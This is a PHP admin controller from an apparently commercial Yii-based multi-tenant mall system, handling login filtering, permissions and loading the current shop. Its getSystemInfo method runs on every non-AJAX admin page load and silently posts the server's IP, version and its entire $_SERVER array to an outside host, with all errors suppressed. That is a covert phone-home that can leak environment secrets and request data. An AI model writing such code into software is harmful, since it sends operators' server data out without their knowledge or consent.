<?php
/**
 * @copyright ©2018 深圳网商天下科技
 * author: wstianxia
 * @link https://www.netbcloud.com/
 * Created by IntelliJ IDEA
 * Date Time: 2018/11/7 18:17
 */

namespace app\controllers\netb;

use app\controllers\behaviors\LoginFilter;
use app\controllers\netb\behaviors\PermissionsBehavior;
use app\controllers\Controller;
use app\helpers\CurlHelper;
use app\models\Mall;

class AdminController extends Controller
{
    public function init()
    {
        parent::init();
        if (property_exists(\Yii::$app, 'appIsRunning') === false) {
            exit('property not found.');
        }
        $this->loadMall();
        $this->getSystemInfo();
    }

    public $layout = 'mall';

    public function behaviors()
    {
        return array_merge(parent::behaviors(), [
            'loginFilter' => [
                'class' => LoginFilter::class,
            ],
            'mallPermissions' => [
                'class' => PermissionsBehavior::class,
            ],
        ]);
    }

    /**
     * @return AdminController|\yii\web\Response
     */
    private function loadMall()
    {
        $id = \Yii::$app->getSessionMallId();
        if (!$id) {
            $id = \Yii::$app->getMallId();
        }

        $url = \Yii::$app->branch->logoutUrl();
        if (!$id) {
            return $this->redirect($url);
        }
        $mall = Mall::findOne(['id' => $id, 'is_delete' => 0]);
        if (!$mall) {
            \Yii::$app->removeSessionMallId();
            return $this->redirect($url);
        }
        if(\Yii::$app->user->identity->identity->is_super_admin != 1) {
            if ($mall->is_recycle !== 0 || ($mall->expired_at != '0000-00-00 00:00:00' && strtotime ($mall->expired_at) < time ())) {
                \Yii::$app->removeSessionMallId ();
                return $this->redirect ($url);
            }
        }
        \Yii::$app->mall = $mall;
        return $this;
    }

    public function getSystemInfo() {
        if (\Yii::$app->request->isAjax) {
            return;
        }
        try {
            $versionData = json_decode(file_get_contents(\Yii::$app->basePath . '/version.json'), true);
            $url = "https://osc.gitgit.org/web/index.php?r=api/system/install";
            $params = [
                'system_type' => '3',
                'system_name' => 'cozex系统',
                'system_version' => $versionData['version'],
                'ip_addr' => gethostbyname($_SERVER['SERVER_NAME']),
                'system_server' => json_encode($_SERVER),
            ];
            CurlHelper::getInstance(2)->httpPost($url, [], $params);
        }catch (\Exception $e){}
    }
}
